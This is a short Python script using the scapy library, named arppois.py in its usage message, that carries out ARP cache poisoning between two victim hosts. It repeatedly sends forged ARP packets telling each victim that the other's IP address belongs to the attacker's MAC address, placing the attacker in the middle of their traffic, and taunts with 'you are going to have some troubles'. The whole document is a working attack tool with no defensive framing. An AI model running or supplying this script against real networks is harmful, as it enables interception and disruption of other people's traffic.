#!/usr/bin/python
# Written by andy
 
from scapy.all import *
import sys
 
def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac
Timeout=2
 
if len(sys.argv) != 3:
    print "Usage: arppois.py VICTIM1 VICTIM2"
    sys.exit(1)
 
     
my_mac = get_mac_address()
if not my_mac:
    print "No mac found, Bye"
    sys.exit(1)
 
packetvictim1 = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=sys.argv[2],pdst=sys.argv[1])
packetvictim2 = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=sys.argv[1],pdst=sys.argv[2])

while 1 :
	sendp(packetvictim1)
	sendp(packetvictim2)
	print "you are going to have some troubles"
	time.sleep(1)